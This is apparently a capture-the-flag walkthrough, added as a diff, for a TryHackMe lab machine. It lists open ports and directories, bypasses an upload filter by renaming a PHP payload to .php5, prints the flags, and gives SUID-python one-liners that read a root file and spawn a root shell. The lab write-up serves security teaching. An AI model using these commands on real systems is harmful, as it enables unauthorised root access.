@@ -1,0 +1,40 @@
+IP=10.10.51.177
+
+
+ports:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+
+------------------------
+
+Directory research results:
+
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.51.177/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.51.177/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.51.177/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.51.177/panel/]
+
+
+/panel --> This directory containing a file upload panel.
+
+When you try to upload a php payload you will see that the website is prohibited to upload a .php file extension.
+change it to .php5 and upload. You will have a shell as www-data by run this payload on website.
+
+
+user.txt file is in the /var/www directory:
+
+THM{y0u_g0t_a_sh3ll}
+
+
+SUID permissions:
+
+/usr/bin/python
+
+you can easly read the file called root.txt via : python -c 'print(open("/root/root.txt").read())'
+
+THM{pr1v1l3g3_3sc4l4t10n}
+
+And also you can use the " ./usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")' " to take a root shell.
